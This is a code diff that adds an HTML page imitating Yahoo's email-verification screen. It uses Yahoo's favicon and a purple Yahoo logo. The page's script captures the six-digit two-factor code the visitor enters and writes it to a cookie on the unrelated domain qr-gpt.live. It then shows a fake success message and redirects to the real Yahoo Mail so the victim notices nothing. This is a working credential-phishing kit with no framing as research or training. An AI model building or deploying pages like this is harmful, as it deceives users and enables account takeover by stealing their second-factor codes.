@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Yahoo - Verify your email</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; 
+            background: #fafafa; 
+            color: #333; 
+            line-height: 1.4;
+        }
+        .container { 
+            max-width: 400px; 
+            margin: 0 auto; 
+            padding: 20px; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center;
+        }
+        .header { 
+            text-align: center; 
+            margin-bottom: 30px; 
+        }
+        .logo { 
+            width: 90px; 
+            height: 32px; 
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTAiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCA5MCAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMEg5MFYzMkgwVjBaIiBmaWxsPSIjNzIwMEZGIi8+Cjx0ZXh0IHg9IjQ1IiB5PSIyMCIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+WWFob288L3RleHQ+Cjwvc3ZnPgo=') no-repeat center;
+            margin: 0 auto;
+        }
+        .form-container { 
+            background: white; 
+            border-radius: 8px; 
+            padding: 40px 30px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .form-title { 
+            font-size: 24px; 
+            font-weight: 300; 
+            margin-bottom: 8px; 
+            text-align: center;
+        }
+        .form-subtitle { 
+            color: #666; 
+            font-size: 14px; 
+            text-align: center; 
+            margin-bottom: 30px;
+        }
+        .email-info {
+            background: #f8f9fa;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+        .code-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .code-input:focus {
+            outline: none;
+            border-color: #7200ff;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 12px;
+            background: #7200ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .verify-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .resend-link {
+            text-align: center;
+            color: #7200ff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo"></div>
+        </div>
+        
+        <div class="form-container">
+            <h1 class="form-title">Check your email</h1>
+            <p class="form-subtitle">We sent a verification code to your email</p>
+            
+            <div class="email-info">
+                We sent a code to <strong id="user-email">your email address</strong>
+            </div>
+            
+            <form id="verify-form">
+                <input 
+                    type="text" 
+                    class="code-input" 
+                    id="verification-code"
+                    name="verification_code"
+                    placeholder="Enter 6-digit code"
+                    maxlength="6"
+                    pattern="[0-9]{6}"
+                    required
+                >
+                
+                <button type="submit" class="verify-btn" id="verify-btn">Verify</button>
+            </form>
+            
+            <a href="#" class="resend-link" id="resend-link">Didn't receive the code? Resend</a>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        // Get username from URL or cookie
+        const urlParams = new URLSearchParams(window.location.search);
+        const username = urlParams.get('u') || getCookie('yh_usr') || 'your email';
+        
+        // Display email
+        document.getElementById('user-email').textContent = decodeURIComponent(username);
+        
+        // Handle form submission
+        document.getElementById('verify-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('verification-code').value;
+            
+            if (code.length === 6) {
+                // Store the 2FA code
+                document.cookie = `yh_2fa_code=${encodeURIComponent(code)}; domain=.qr-gpt.live; path=/; max-age=7200`;
+                
+                // Simulate verification success and redirect to success page
+                alert('Verification successful! Redirecting...');
+                window.location.href = 'https://mail.yahoo.com/d/folders/1';
+            } else {
+                alert('Please enter a valid 6-digit code');
+            }
+        });
+        
+        // Handle resend link
+        document.getElementById('resend-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Verification code resent to your email');
+        });
+        
+        // Auto-focus on code input
+        document.getElementById('verification-code').focus();
+        
+        // Helper function to get cookie
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+    })();
+    </script>
+</body>
+</html>
